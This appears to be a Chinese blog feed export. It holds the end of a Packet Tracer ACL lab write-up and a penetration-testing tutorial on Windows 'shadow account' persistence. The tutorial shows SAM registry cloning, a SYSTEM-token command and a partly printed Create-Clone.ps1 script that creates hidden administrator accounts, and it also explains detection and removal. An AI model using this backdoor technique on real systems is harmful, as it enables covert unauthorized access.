ACL配置</h2><ol><li><p>在tj-sw-zuo交换机上进行ACL配置，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/ComExperiment2/tj-sw-zuo上的ACL配置.png" alt="tj-sw-zuo上的ACL配置"></center></li><li><p>在tj-sw-you交换机上进行ACL配置，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/ComExperiment2/tj-sw-you上的ACL.png" alt="tj-sw-you上的ACL"></center></li><li><p>在tj-R路由器上进行ACL配置，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/ComExperiment2/tj-R上配置ACL.png" alt="tj-R上配置ACL"></center></li><li><p>在bj-R路由器上进行ACL配置，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/ComExperiment2/在bj-R上配置ACL.png" alt="在bj-R上配置ACL"></center></li></ol><h1 id="实验结果"><a href="#实验结果" class="headerlink" title="实验结果"></a>实验结果</h1><p>实验完成对按照实验要求进行验证。</p><ol><li><p>假设3sw-zuo的<code>f0/4</code>接口意外故障，则使用<code>bj-admin-A</code>访问<code>www.bihuo.com</code>理论上是依然可以的，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/ComExperiment2/bj-admin-A测试到外网的连通性.png" alt="bj-admin-A测试到外网的连通性"></center></li><li><p>bj-other-A访问FTP（192.168.1.146）理论上应该是可以，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/ComExperiment2/bj-other-A访问FTP.png" alt="bj-other-A访问FTP"></center></li><li><p>bj-other-A访问Web（192.168.1.142）理论上不可访问，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/ComExperiment2/bj-other-A访问Web结果.png" alt="bj-other-A访问Web结果"></center></li><li><p>bj-other-B访问FTP（192.168.1.146）理论上拒绝访问，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/ComExperiment2/bj-other-B访问FTP.png" alt="bj-other-B访问FTP"></center></li><li><p>bj-admin-A使用ping测试与Web服务器连通性，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/ComExperiment2/bj-admin-A与Web的ping测试.png" alt="bj-admin-A与Web的ping测试"></center></li><li><p>bj-other-A使用ping测试与Web服务器连通性，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/ComExperiment2/bj-other-A与Web的ping测试.png" alt="bj-other-A与Web的ping测试"></center></li><li><p>bj-other-B访问Web（<code>www.bihuo.com</code>），操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/ComExperiment2/bj-other-B访问web.png" alt="bj-other-B访问web"></center></li><li><p>tj-admin-A使用telnet连接tj-sw-zuo，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/ComExperiment2/tj-admin-A远程管理tj-sw-zuo.png" alt="tj-admin-A远程管理tj-sw-zuo"></center></li><li><p>VLAN200内主机访问ISP的Web和DNS，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/ComExperiment2/vlan200主机访问web.png" alt="vlan200主机访问web"></center></li><li><p>vlan300主机访问<code>www.bihuo.com</code>，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/ComExperiment2/vlan300访问web.png" alt="vlan300访问web"></center></li><li><p>tj-other-A使用ping测试与Web的连通性。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/ComExperiment2/tj-other-A的ping测试.png" alt="tj-other-A的ping测试"></center></li></ol><h1 id="实验总结"><a href="#实验总结" class="headerlink" title="实验总结"></a>实验总结</h1><ul><li>配置比较复杂的实验时，首先应该配置基础的网络环境，先保证整个网络的连通性，接着再将各部分要求依次添加，最后设置各部分的ACL。</li><li>配置访问控制列表时要注意整合所有要求尽量使用最简的方式实现ACL，注意ACL条目的顺序和ACL应该的接口位置，都可能影响ACL的应用结果。</li></ul><h1 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h1><p>配置脚本：</p><pre class=" language-shell"><code class="language-shell">大型综合实验1.设备命名2.子网划分3.基础网络配置    -> ip    -> vlan    -> route=========================================================网络基础配置============================================================================tj-sw-zuo====================enconf tno ip domain-lookupline console 0exec-timeout 0 0logging synexithostname tj-sw-zuovlan 100name tj-othervlan 200name tj-servervlan 300name tj-adminexitint f0/1switchport mode trunkint f0/2switchport mode accessswitchport access vlan 100int f0/3switchport mode accessswitchport access vlan 200int range f0/4-5switchport mode trunkchannel-group 1 mode on==============tj-sw-you====================enconf tno ip domain-lookupline console 0exec-timeout 0 0logging synexithostname tj-sw-youvlan 100name tj-othervlan 200name tj-servervlan 300name tj-adminexitint f0/1switchport mode accessswitchport access vlan 100int f0/2switchport mode accessswitchport access vlan 300int range f0/3-4switchport mode trunkchannel-group 1 mode on==============tj-R=======================enconf tno ip domain-lookupline console 0exec-timeout 0 0logging synexithostname tj-Rint f0/1.1encapsulation dot1Q 100ip add 192.168.1.49 255.255.255.240no shint f0/1.2encapsulation dot1Q 200ip add 192.168.1.65 255.255.255.240no shint f0/1.3encapsulation dot1Q 300ip add 192.168.1.81 255.255.255.240no shint f0/1no shint s1/0ip add 192.168.1.226 255.255.255.240no shexitip dhcp pool tj-vlan100network 192.168.1.48 255.255.255.240default-router 192.168.1.49dns-server 192.168.1.141exitip dhcp excluded-address 192.168.1.49 192.168.1.52ip dhcp pool tj-vlan200network 192.168.1.64 255.255.255.240default-router 192.168.1.65dns-server 192.168.1.141exitip dhcp excluded-address 192.168.1.65 192.168.1.65ip dhcp pool tj-vlan300network 192.168.1.80 255.255.255.240default-router 192.168.1.81dns-server 192.168.1.141exitip dhcp excluded-address 192.168.1.81 192.168.1.81route ripversion 2no auto-summary network 192.168.1.48network 192.168.1.64network    192.168.1.80network 192.168.1.224==================ISP-B===============enconf tno ip domain-lookupline console 0exec-timeout 0 0logging synexithostname ISP-Bint f0/0ip add 192.168.1.242 255.255.255.240no shint f0/1ip add 192.168.1.194 255.255.255.240no shint s1/0ip add 192.168.1.225 255.255.255.240clock rate 9600no shroute ripversion    2no auto-summary network 192.168.1.224network 192.168.1.240network 192.168.1.192==================ISP-B-DHCP-server======enconf tno ip domain-lookupline console 0exec-timeout 0 0logging synexithostname ISP-B-DHCP-serverip routingint f0/3no switchportip add 192.168.1.193 255.255.255.240no shint vlan 1ip add 192.168.1.145 255.255.255.240no shexitip dhcp pool ISP-B-poolnetwork 192.168.1.144 255.255.255.240default-router 192.168.1.145dns-server 192.168.1.141exitip dhcp excluded-address 192.168.1.145 192.168.1.146route ripversion 2no auto-summarynetwork 192.168.1.192network 192.168.1.144=================ISP-A==================enconf tno ip domain-lookupline console 0exec-timeout 0 0logging synexithostname ISP-Aint f0/1ip add 192.168.1.241 255.255.255.240no shint f0/0ip add 192.168.1.129 255.255.255.240no shint s1/0ip add 192.168.1.210 255.255.255.240clock rate 9600no shroute ripversion 2no auto-summarynetwork 192.168.1.240network 192.168.1.128network 192.168.1.208==================bj-R==================enconf t no ip domain-lookupline console 0exec-timeout 0 0logging synexithostname bj-Rint s1/0ip add 192.168.1.209 255.255.255.240no shint f0/0ip add 192.168.1.162 255.255.255.240no shint f0/1ip add 192.168.1.178 255.255.255.240no shexitroute ripversion 2no auto-summarynetwork 192.168.1.208network 192.168.1.160network 192.168.1.176===================3sw-zuo================enconf t no ip domain-lookupline console 0exec-timeout 0 0logging synexithostname 3sw-zuovlan 10name bj-adminvlan 20name bj-othervlan 100name DMZ-serverexitip routingint range f0/1-3switchport trunk encapsulation dot1Qswitchport mode trunkint f0/4no switchportip add 192.168.1.161 255.255.255.240no shint vlan 10ip add 192.168.1.2 255.255.255.240no ship helper-address 192.168.1.46int vlan 20ip add 192.168.1.18 255.255.255.240no ship helper-address 192.168.1.46int vlan 100ip add 192.168.1.34 255.255.255.240no ship helper-address 192.168.1.46exitroute ripversion 2no auto-summarynetwork 192.168.1.0network 192.168.1.16network 192.168.1.32network 192.168.1.160spanning-tree vlan 10 root primaryspanning-tree vlan 20 root secondaryspanning-tree vlan 100 root primaryint vlan 10 standby 10 ip 192.168.1.1standby 10 priority 105standby 10 preemptstandby 10 track f0/4int vlan 20standby 20 ip 192.168.1.17standby 20 priority 100standby 20 preemptstandby 20 track f0/4int vlan 100standby 100 ip 192.168.1.33standby 100 priority 105standby 100 preemptstandby 100 track f0/4=================3sw-you===========enconf t no ip domain-lookupline console 0exec-timeout 0 0logging synexithostname 3sw-youvlan 10name bj-adminvlan 20name bj-othervlan 100name DMZ-serverexitip routingint range f0/1-3switchport trunk encapsulation dot1Qswitchport mode trunkint f0/4no switchportip add 192.168.1.177 255.255.255.240no shint vlan 10ip add 192.168.1.3 255.255.255.240no ship helper-address 192.168.1.46int vlan 20ip add 192.168.1.19 255.255.255.240no ship helper-address 192.168.1.46int vlan 100ip add 192.168.1.35 255.255.255.240no ship helper-address 192.168.1.46exitroute ripversion 2no auto-summarynetwork 192.168.1.0network 192.168.1.16network 192.168.1.32network 192.168.1.176spanning-tree vlan 10 root secondaryspanning-tree vlan 20 root primaryspanning-tree vlan 100 root secondaryint vlan 10 standby 10 ip 192.168.1.1standby 10 priority 100standby 10 preemptstandby 10 track f0/4int vlan 20standby 20 ip 192.168.1.17standby 20 priority 105standby 20 preemptstandby 20 track f0/4int vlan 100standby 100 ip 192.168.1.33standby 100 priority 100standby 100 preemptstandby 100 track f0/4===============2sw-zuo===============enconf t no ip domain-lookupline console 0exec-timeout 0 0logging synexithostname 2sw-zuovlan 10name bj-adminvlan 20name bj-othervlan 100name DMZ-serverexitint f0/1switchport mode accessswitchport access vlan 100int f0/2switchport mode accessswitchport access vlan 10int f0/3switchport mode accessswitchport access vlan 20int range f0/4-5switchport mode trunk==============2sw-you===============enconf t no ip domain-lookupline console 0exec-timeout 0 0logging synexithostname 2sw-youvlan 10name bj-adminvlan 20name bj-othervlan 100name DMZ-serverexitint f0/1switchport mode accessswitchport access vlan 10int f0/2switchport mode accessswitchport access vlan 20int range f0/3-4switchport mode trunk4.远程管理配置=========================================================远程管理配置===============================================================================tj-sw-zuo=================enconf tenable pass ciscoint vlan 100ip add 192.168.1.50 255.255.255.240no shexitip default-gateway 192.168.1.49line vty 0 4pass ciscologinexit=================tj-sw-you=================enconf tenable pass ciscoint vlan 100ip add 192.168.1.51 255.255.255.240no shexitip default-gateway 192.168.1.49line vty 0 4pass ciscologinexit==================tj-R==================enconf t enable pass ciscoip domain-name cisco.comcrypto key generate rsa general-keys modulus 1024username admin password ciscoip ssh version 2ip ssh time-out 120ip ssh authentication-retries 3line vty 0 4transport input sshlogin local==================bj-R=================enconf t enable pass ciscoip domain-name cisco.comcrypto key generate rsa general-keys modulus 1024username admin password ciscoip ssh version 2ip ssh time-out 120ip ssh authentication-retries 3line vty 0 4transport input sshlogin local==================3sw-zuo==============enconf t enable pass ciscoip domain-name cisco.comcrypto key generate rsa general-keys modulus 1024username admin password ciscoip ssh version 2ip ssh time-out 120ip ssh authentication-retries 3line vty 0 4transport input alllogin local===================3sw-you================enconf t enable pass ciscoip domain-name cisco.comcrypto key generate rsa general-keys modulus 1024username admin password ciscoip ssh version 2ip ssh time-out 120ip ssh authentication-retries 3line vty 0 4transport input alllogin local5.ACL配置============================================================ACL配置===============================================================================tj-sw-zuo(you)======================access-list 10 permit 192.168.1.80 0.0.0.15line vty 0 4access-class 10 in================tj-R=======================ip access-list extended tj-ACL-ISPdeny tcp 192.168.1.64 0.0.0.15 host 192.168.1.142 eq 80deny udp 192.168.1.64 0.0.0.15 host 192.168.1.141 eq 53permit tcp 192.168.1.64 0.0.0.15 host 192.168.1.146 eq 21permit tcp 192.168.1.80 0.0.0.15 host 192.168.1.142 eq 80permit tcp 192.168.1.80 0.0.0.15 host 192.168.1.141 eq 53permit tcp 192.168.1.80 0.0.0.15 host 192.168.1.146 eq 21permit icmp host 192.168.1.54 host 192.168.1.142 echopermit icmp host 192.168.1.54 host 192.168.1.141 echodeny tcp host 192.168.1.54 anypermit ip any anyexitint s1/0ip access-group tj-ACL-ISP out ======================bj-R===================ip access-list extended bj-ACL-ISPpermit ip 192.168.1.0 0.0.0.15 anypermit tcp host 192.168.1.22 host 192.168.1.146 eq 21deny tcp host 192.168.1.22 host 192.168.1.142 eq 80deny tcp host 192.168.1.24 host 192.168.1.146 eq 21permit icmp 192.168.1.0 0.0.0.15 host 192.168.1.142permit icmp 192.168.1.0 0.0.0.15 host 192.168.1.141permit icmp 192.168.1.0 0.0.0.15 host 192.168.1.146deny icmp any host 192.168.1.142deny icmp any host 192.168.1.141deny icmp any host 192.168.1.146permit udp 192.168.1.0 0.0.0.15 host 192.168.1.141 eq 53permit udp 192.168.1.16 0.0.0.15 host 192.168.1.141 eq 53permit ip any anyexitint s1/0ip access-group bj-ACL-ISP out</code></pre><ul><li><p>PKT文件获取方式：链接：<a href="https://pan.baidu.com/s/1tbpxMZ0qowYvPPcVQt-EaQ" target="_blank" rel="noopener">https://pan.baidu.com/s/1tbpxMZ0qowYvPPcVQt-EaQ</a> 提取码：zmeo </p></li><li><p><font color="blue">由于PT中做DHCP无法为主机预分配地址，在做ACL配置的要注意动态获取的IP，即使时相同拓扑打开之后自动获取的IP信息也不一样，因此建议修改ACL配置脚本后重新设置ACL.</font></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络配置 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络实验 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>权限维持之影子账户</title>
      <link href="/2020/11/28/quan-xian-wei-chi-zhi-ying-zi-zhang-hu/"/>
      <url>/2020/11/28/quan-xian-wei-chi-zhi-ying-zi-zhang-hu/</url>
      
        <content type="html"><![CDATA[<h1 id="影子账户的定义"><a href="#影子账户的定义" class="headerlink" title="影子账户的定义"></a>影子账户的定义</h1><p>​        影子账户 顾名思义就是隐藏的账户，在【用户账户】里面看不见，但却有管理员权限的账户。影子账户这一概念随着Windows系统产生，在黑客技术里与后门安装（权限维持）技术挂钩。由于它的隐藏性强，入侵者多在被入侵的电脑里加这样的账户，用于远程登录以便控制客户机。</p><h1 id="影子账户的作用"><a href="#影子账户的作用" class="headerlink" title="影子账户的作用"></a>影子账户的作用</h1><ol><li><strong>认证绕过</strong>。在渗透的时候，拿到了服务器的管理员权限，但是没有拿到服务器上MSSQL数据库sa密码，且数据库也添加本地管理员来管理数据库时，想要得到数据库里面的信息，可以创建<code>Administrator</code>账户的影子账户，然后使用影子账户登录服务器，即可使用<code>Aministrator</code>的身份验证进入数据库，并且有非常大的权限。</li><li><strong>权限维持</strong>。影子账号和普通账户不一样，它是一个隐蔽的账号，在Windows 2003上面是很难发现和清除，在Windows 2008以上的影子账户<strong>只能在注册表中看到</strong>。但是影子账户有一个缺点就是在渗透测试时使用影子账户登录服务器如果改动了什么东西，<code>Administrator</code>登录后可以看到改动的结果。</li></ol><h1 id="创建影子账户"><a href="#创建影子账户" class="headerlink" title="创建影子账户"></a>创建影子账户</h1><h2 id="图形化方式创建"><a href="#图形化方式创建" class="headerlink" title="图形化方式创建"></a>图形化方式创建</h2><ol><li><p>创建一个名为<code>ss$</code>的用户，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/POC/ms17-010/创建新用户作为影子账户.png" alt="创建新用户作为影子账户"></center></li><li><p>使用<code>regedit</code>打开注册表<code>HKEY_LOCAL_MACHINE/SAM/SAM/Domains/Account/Users/</code>，显示结果如下图所示。<font color="blue">若打不开则需要设置权限，默认情况下SAM文件夹只有SYSTEM具有完全控制权限。</font></p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/POC/ms17-010/打开注册表.png" alt="打开注册表"></center></li><li><p>在<strong>Names</strong>文件夹中点击【<code>ss$</code>】，在右侧显示16进制数值如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/POC/ms17-010/查看ss$用户.png" alt="查看ss$用户"></center></li><li><p>找到Administrator的十六进制数字，然后找到对应的00000（十六进制）文件夹打开，复制Administrator的<strong>000001F4</strong>文件夹里面的<strong>F值</strong>到我们的隐藏账户<code>ss$</code>里面的<strong>F值</strong>中，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/POC/ms17-010/影子账户修改F值.gif" alt="影子账户修改F值"></center></li><li><p>找到<strong>Names</strong>里面的<code>ss$</code>和<code>ss$</code>对应的十六进制目录，右键导出到桌面，操作结果如下如所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/POC/ms17-010/注册表导出.png" alt="注册表导出"></center></li><li><p>使用<code>net user ss$ /del</code>命令删除<code>ss$</code>用户，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/POC/ms17-010/删除ss$用户.png" alt="删除ss$用户"></center></li><li><p>将刚刚导出的注册表信息重新导入，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/POC/ms17-010/注册表导入.png" alt="注册表导入"></center></li><li><p>使用影子账户<code>ss$</code>登录，其实是以Administrator的身份登录，影子账户所做操作，Administrator都可以看见。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/POC/ms17-010/影子账户登录.png" alt="影子账户登录"></center></li></ol><h2 id="脚本方式创建"><a href="#脚本方式创建" class="headerlink" title="脚本方式创建"></a>脚本方式创建</h2><h3 id="方式1：对注册表添加管理员帐户的编辑权限"><a href="#方式1：对注册表添加管理员帐户的编辑权限" class="headerlink" title="方式1：对注册表添加管理员帐户的编辑权限"></a>方式1：对注册表添加管理员帐户的编辑权限</h3><p>​        直接使用<a href="https://github.com/Ridter/Pentest/blob/master/powershell/MyShell/Create-Clone.ps1" target="_blank" rel="noopener"><code>Create-Clone.ps1</code></a>脚本创建影子账户，但是需要管理员权限才可执行。</p><ul><li><p>运行条件：需要管理员权限</p></li><li><p>运行结果：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/PermissionsMaintained/ShadowAccount/create-clone创建影子账户.png" alt="create-clone创建影子账户"></center></li></ul><h3 id="方式2：直接获得System权限"><a href="#方式2：直接获得System权限" class="headerlink" title="方式2：直接获得System权限"></a>方式2：直接获得System权限</h3><ol><li><p>使用<a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-TokenManipulation.ps1" target="_blank" rel="noopener"><code>Invoke-TokenManipulation.ps1</code></a>脚本先获得System权限，进而拥有对注册表的编辑权限。</p><pre class=" language-powershell"><code class="language-powershell"><span class="token punctuation">.</span> <span class="token punctuation">.</span>\Invoke<span class="token operator">-</span>TokenManipulation<span class="token punctuation">.</span>ps1Invoke<span class="token operator">-</span>TokenManipulation <span class="token operator">-</span>CreateProcess <span class="token string">"cmd.exe"</span> <span class="token operator">-</span>Username <span class="token string">"nt authority\system"</span></code></pre><p>得到一个<code>SYSTEM</code>权限的<code>cmd.exe</code>程序。</p></li><li><p>在cmd中执行<a href="https://github.com/3gstudent/Windows-User-Clone" target="_blank" rel="noopener"><code>Windows-User-Clone.ps1</code></a>脚本，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/PermissionsMaintained/ShadowAccount/以SYSTEM权限创建影子账户.png" alt="以SYSTEM权限创建影子账户"></center></li></ol><h1 id="影子账户利用思路"><a href="#影子账户利用思路" class="headerlink" title="影子账户利用思路"></a>影子账户利用思路</h1><ol><li><strong>克隆管理员Administrator账户权限</strong><ul><li>需要注意管理员帐户是否被禁用，如果被禁用，那么克隆出的隐藏帐户也是被禁用状态。</li></ul></li><li><strong>复制已有账户</strong><ul><li>在3389远程登录的利用上存在相同帐户的冲突关系</li><li>如果系统当前登录帐号为<code>a</code>，那么使用由账户a克隆来的隐藏帐户<code>aaa$</code>登录的话，会系统被识别为帐户<code>a</code>，导致帐户<code>a</code>下线</li></ul></li><li><strong>新建账户再复制</strong><ul><li>新建管理员帐户<code>b</code>，克隆帐户<code>b</code>，建立隐藏账户<code>bbb$</code></li><li>删除管理员帐户<code>b</code>，隐藏账户<code>bbb$</code>仍然有效</li></ul></li><li><strong>原账户的维持</strong><ul><li>克隆帐户<code>a</code>的权限，建立隐藏帐户<code>aaa$</code></li><li>修改帐户<code>a</code>的密码，隐藏帐户<code>aaa$</code>仍然有效</li></ul></li></ol><h1 id="查看影子账户"><a href="#查看影子账户" class="headerlink" title="查看影子账户"></a>查看影子账户</h1><ul><li>隐藏账户制作完成，控制面板不存在账户<code>ss$</code>；</li><li>通过<code>net user</code>无法列出改账户；</li><li>【计算机管理】→ 【本地用户和组】→ 【用户】也无法列出该帐户；</li><li><font color="blue">但可使用<code>net user ss$</code>命令查看影子账户信息</font>；</li><li><font color="blue">而且在注册表的<code>HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\</code>文件夹下也可以看到<code>ss$</code>账户信息（最有效的方式）</font>。</li><li>隐藏帐户的登录记录，可通过查看日志获取</li></ul><h1 id="删除影子账户"><a href="#删除影子账户" class="headerlink" title="删除影子账户"></a>删除影子账户</h1><ul><li>在注册表的<code>HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\</code>文件夹下删除指定用户名相关的文件夹和以十六进制命令的文件夹即可。</li></ul><h1 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h1><p>Create-Clone.ps1脚本内容如下所示：</p><pre class=" language-powershell"><code class="language-powershell"><span class="token keyword">function</span> Create<span class="token operator">-</span>Clone<span class="token punctuation">{</span><span class="token comment" spellcheck="true">&lt;#.SYNOPSISThis script requires Administrator privileges. use Invoke-TokenManipulation.ps1 to get system privileges and create the clone user..PARAMETER uThe clone username.PARAMETER pThe clone user's password.PARAMETER cuThe user to clone, default administrator .EXAMPLECreate-Clone -u evi1cg -p evi1cg123 -cu administrator#></span>    <span class="token keyword">Param</span><span class="token punctuation">(</span>        <span class="token namespace">[Parameter(Mandatory=$true)]</span>        <span class="token namespace">[String]</span>        <span class="token variable">$u</span><span class="token punctuation">,</span>        <span class="token namespace">[Parameter(Mandatory=$true)]</span>        <span class="token namespace">[String]</span>        <span class="token variable">$p</span><span class="token punctuation">,</span>        <span class="token namespace">[Parameter(Mandatory=$false)]</span>        <span class="token namespace">[String]</span>        <span class="token variable">$cu</span> = <span class="token string">"administrator"</span>    <span class="token punctuation">)</span>    <span class="token keyword">function</span> upReg<span class="token punctuation">{</span>        <span class="token string">"HKEY_LOCAL_MACHINE\SAM [1 17]"</span> <span class="token punctuation">|</span> <span class="token function">Out-File</span> <span class="token variable">$env</span>:temp\up<span class="token punctuation">.</span>ini        <span class="token string">"HKEY_LOCAL_MACHINE\SAM\SAM [1 17]"</span><span class="token punctuation">|</span> <span class="token function">Out-File</span> <span class="token operator">-</span>Append  <span class="token variable">$env</span>:temp\up<span class="token punctuation">.</span>ini        <span class="token string">"HKEY_LOCAL_MACHINE\SAM\SAM\Domains [1 17]"</span> <span class="token punctuation">|</span> <span class="token function">Out-File</span> <span class="token operator">-</span>Append  <span class="token variable">$env</span>:temp\up<span class="token punctuation">.</span>ini        <span class="token string">"HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account [1 17] "</span><span class="token punctuation">|</span> <span class="token function">Out-File</span> <span class="token operator">-</span>Append  <span class="token variable">$env</span>:temp\up<span class="token punctuation">.</span>ini        <span class="token string">"HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users [1 17] "</span><span class="token punctuation">|</span> <span class="token function">Out-File</span> <span class="token operator">-</span>Append  <span class="token variable">$env</span>:temp\up<span class="token punctuation">.</span>ini        <span class="token string">"HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names [1 17]"</span><span class="token punctuation">|</span> <span class="token function">Out-File</span> <span class="token operator">-</span>Append  <span class="token variable">$env</span>:temp\up<span class="token punctuation">.</span>ini        cmd <span class="token operator">/</span>c <span class="token string">"regini <span class="token variable">$env</span>:temp\up.ini"</span>        <span class="token function">Remove-Item</span> <span class="token variable">$env</span>:temp\up<span class="token punctuation">.</span>ini    <span class="token punctuation">}</span>    <span class="token keyword">function</span> downreg <span class="token punctuation">{</span>        <span class="token string">"HKEY_LOCAL_MACHINE\SAM [1 17]"</span> <span class="token punctuation">|</span> <span class="token function">Out-File</span> <span class="token variable">$env</span>:temp\down<span class="token punctuation">.</span>ini        <span class="token string">"HKEY_LOCAL_MACHINE\SAM\SAM [17]"</span><span class="token punctuation">|</span> <span class="token function">Out-File</span> <span class="token operator">-</span>Append  <span class="token variable">$env</span>:temp\down<span class="token punctuation">.</span>ini        <span class="token string">"HKEY_LOCAL_MACHINE\SAM\SAM\Domains [17]"</span> <span class="token punctuation">|</span> <span class="token function">Out-File</span> <span class="token operator">-</span>Append  <span class="token variable">$env</span>:temp\down<span class="token punctuation">.</span>ini        <span class="token string">"HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account [17] "</span><span class="token punctuation">|</span> <span class="token function">Out-File</span> <span class="token operator">-</span>Append  <span class="token variable">$env</span>:temp\down<span class="token punctuation">.</span>ini        <span class="token string">"HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users [17] "</span><span class="token punctuation">|</span> <span class="token function">Out-File</span> <span class="token operator">-</span>Append  <span class="token variable">$env</span>:temp\down<span class="token punctuation">.</span>ini        <span class="token string">"HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names [17]"</span><span class="token punctuation">|</span> <span class="token function">Out-File</span> <span class="token operator">-</span>Append  <span class="token variable">$env</span>:temp\down<span class="token punctuation">.</span>ini        cmd <span class="token operator">/</span>c <span class="token string">"regini <span class="token variable">$env</span>:temp\down.ini"</span>        <span class="token function">Remove-Item</span> <span class="token variable">$env</span>:temp\down<span class="token punctuation">.</span>ini    <span class="token punctuation">}</span>    <span class="token keyword">function</span> Create<span class="token operator">-</span>user <span class="token punctuation">(</span><span class="token namespace">[string]</span><span class="token variable">$Username</span><span class="token punctuation">,</span><span class="token namespace">[string]</span><span class="token variable">$Password</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$group</span> = <span class="token string">"Administrators"</span>        <span class="token variable">$existing</span> = <span class="token function">Test-Path</span> <span class="token operator">-</span>path <span class="token string">"HKLM:\SAM\SAM\Domains\Account\Users\Names\<span class="token variable">$Username</span>"</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$existing</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">Write-Host</span> <span class="token string">"[*] Creating new local user <span class="token variable">$Username</span> with password <span class="token variable">$Password</span>"</span>            &amp; NET USER <span class="token variable">$Username</span> <span class="token variable">$Password</span> <span class="token operator">/</span>add <span class="token operator">/</span>y <span class="token operator">/</span>expires:never <span class="token punctuation">|</span> <span class="token function">Out-Null</span>            <span class="token function">Write-Host</span> <span class="token string">"[*] Adding local user <span class="token variable">$Username</span> to <span class="token variable">$group</span>."</span>            &amp; NET LOCALGROUP <span class="token variable">$group</span> <span class="token variable">$Username</span> <span class="token operator">/</span>add <span class="token punctuation">|</span> <span class="token function">Out-Null</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token function">Write-Host</span> <span class="token string">"[*] Adding existing user <span class="token variable">$Username</span> to <span class="token variable">$group</span>."</span>            &amp; NET LOCALGROUP <span class="token variable">$group</span> <span class="token variable">$Username</span> <span class="token operator">/</span>add <span class="token punctuation">|</span> <span class="token function">Out-Null</span>            <span class="token variable">$adsi</span> = <span class="token namespace">[ADSI]</span><span class="token string">"WinNT://<span class="token variable">$env</span>:COMPUTERNAME"</span>            <span class="token variable">$exist</span> = <span class="token variable">$adsi</span><span class="token punctuation">.</span>Children <span class="token punctuation">|</span> where <span class="token punctuation">{</span><span class="token variable">$_</span><span class="token punctuation">.</span>SchemaClassName <span class="token operator">-eq</span> <span class="token string">'user'</span> <span class="token operator">-and</span> <span class="token variable">$_</span><span class="token punctuation">.</span>Name <span class="token operator">-eq</span> <span class="token variable">$Username</span> <span class="token punctuation">}</span>            <span class="token function">Write-Host</span> <span class="token string">"[*] Setting password for existing local user <span class="token variable">$Username</span>"</span>            <span class="token variable">$exist</span><span class="token punctuation">.</span>SetPassword<span class="token punctuation">(</span><span class="token variable">$Password</span><span class="token punctuation">)</span>         <span class="token punctuation">}</span>        <span class="token function">Write-Host</span> <span class="token string">"[*] Ensuring password for <span class="token variable">$Username</span> never expires."</span>        &amp; WMIC USERACCOUNT WHERE <span class="token string">"Name='<span class="token variable">$Username</span>'"</span> <span class="token function">SET</span> PasswordExpires=FALSE   <span class="token punctuation">|</span> <span class="token function">Out-Null</span>      <span class="token punctuation">}</span>    <span class="token keyword">function</span> GetUser<span class="token operator">-</span>Key<span class="token punctuation">(</span><span class="token namespace">[string]</span><span class="token variable">$user</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        cmd <span class="token operator">/</span>c <span class="token string">" echo HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names\<span class="token variable">$user</span> [1 17] >> <span class="token variable">$env</span>:temp\<span class="token variable">$user</span>.ini"</span>        cmd <span class="token operator">/</span>c <span class="token string">"regini <span class="token 